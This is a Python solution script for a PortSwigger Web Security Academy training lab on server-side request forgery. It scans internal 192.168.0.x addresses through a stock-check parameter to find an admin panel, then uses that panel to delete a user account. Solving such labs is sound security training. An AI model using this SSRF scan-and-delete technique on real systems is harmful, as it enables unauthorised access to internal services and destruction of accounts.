# Script for Portswigger lab "Basic SSRF against another back-end system"

import requests

from rich.console import Console

SERVER = 'https://0afb00b5042530b9820d16a000a30000.web-security-academy.net/'
STOCK_ENDPOINT = 'product/stock'

console = Console()
session = requests.session()


def fuzz_ip_address():
    index = None
    for i in range(255):
        console.print('Trying with: ', i)
        endpoint = 'http://192.168.0.' + str(i) + ':8080/admin'
        response = session.post(f"{SERVER}{STOCK_ENDPOINT}", data={
            'stockApi': endpoint,
        },)
        console.print("CODE: ", response.status_code)
        if response.status_code == 200:
            console.print("TEXT: ", response.text)
            index = i
            break
    return index

def delete_user(index: int):
    endpoint = 'http://192.168.0.' + str(index) + ':8080/admin/delete?username=carlos'
    response = session.post(f"{SERVER}{STOCK_ENDPOINT}", data={
        'stockApi': endpoint,
    }, headers={
        'Referer': SERVER,
    })
    console.print("CODE: ", response.status_code)
    return response


with console.status("Fuzzing on IP addresses..."):
    index = fuzz_ip_address()
    console.print(f"Found IP address 192.168.0.{index}")
with console.status("Deleting user..."):
   response = delete_user(index)
   console.log(f"CODE: {response.status_code}, TEXT: {response.text}")